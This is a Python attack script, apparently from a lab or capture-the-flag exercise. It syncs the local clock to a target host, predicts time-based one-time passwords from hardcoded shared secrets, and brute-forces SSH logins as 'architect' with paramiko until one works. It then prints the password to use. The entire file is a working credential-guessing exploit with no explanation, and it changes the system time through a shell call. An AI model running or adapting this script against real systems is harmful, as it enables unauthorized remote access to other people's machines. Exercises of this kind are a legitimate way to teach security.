from datetime import datetime, timedelta
import time
import subprocess
from hashlib import sha256
import random
import sys
import paramiko
from time import ctime
import ntplib
import os

#shared secret token for OTP calculation
sharedSecret1 = 128939448577488
sharedSecret2 = 592988748673453
sharedSecret3 = 792513759492579
USER = "architect"
RHOST = "10.10.243.129"

try:
    #import ntplib
    client = ntplib.NTPClient()
    response = client.request(RHOST) #IP of linux-bay server
    #print(response)
    os.system('date ' + time.strftime('%m%d%H%M%Y.%S',time.localtime(response.tx_time)))
except:
    print('Could not sync with time server.')
    sys.exit()

print('\nTime Sync Completed Successfully.\nConducting brute-force on OTP\n')

secretList = [sharedSecret1, sharedSecret2, sharedSecret3]

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    CurrentTime = int(now.strftime("%d%H%M"))
    return(CurrentTime)

def getRandom():
    ca = TimeSet('Ukraine', 4, 43, 1)
    cb = TimeSet('Germany', 13, 55, 0)
    cc = TimeSet('England', 9, 19, 1)
    cd = TimeSet('Nigeria', 1, 6, 1)
    ce = TimeSet('Denmark', -5, 18, 1)
    timeSetList = [ca, cb, cc, cd, ce]
    randomTimeSet = random.sample(timeSetList, 3)
    
    ctt = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]
    uc = ctt ^ random.choice(secretList)
    hc = (sha256(repr(uc).encode('utf-8')).hexdigest())
    t = hc[22:44]
    print(t)
    return t

while True:
    OTP = getRandom()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(RHOST, username=USER, password=OTP)
        print(f"Success with: {OTP}\n")
        #OTP = bytes(str(OTP), encoding='utf-8')
        #RHOST = bytes(str(RHOST), encoding='utf-8')
        #output = subprocess.getoutput(f'gnome-terminal -x bash -c "sshpass -p {OTP} ssh {USER}@{RHOST}"')
        #exec(output)
        print(f"Execute this command: ssh architect@{RHOST} with this password: {OTP}\n\n You have 60 seconds or less to run this command.")
        sys.exit()
    except paramiko.ssh_exception.SSHException as e:
        if e == "Error reading SSH protocol banner":
            print(end="")
            continue